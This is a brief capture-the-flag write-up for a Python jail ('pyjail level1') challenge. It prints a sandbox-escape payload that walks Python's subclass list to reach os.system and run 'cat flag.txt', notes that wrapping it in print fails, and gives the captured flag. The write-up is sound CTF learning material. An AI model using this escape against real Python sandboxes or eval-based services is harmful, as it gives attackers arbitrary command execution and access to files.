Title: level1

Description:
```
Solve the level1 challenge of the pyjail series

Note: The server is running on Ubuntu 20.04
```

Refer to the first [challenge](https://github.com/Coder-Here/ShaktiCTF/blob/main/Misc/level0/README.md), the payload works from there, but without the print function.

```
print([].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('cat flag.txt'))

the above does not work, try the below one without the print function

[].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('cat flag.txt')
```

![image](https://user-images.githubusercontent.com/63996033/206860336-27f7486c-8115-41c1-bfd1-6d8bfb0b796e.png)

Flag: shakti{7h47_W45_4_Cl053_C4ll!!!}


What is ```Word of advice,remember this:weYbdk9012ghiwh=0?``` for ?????
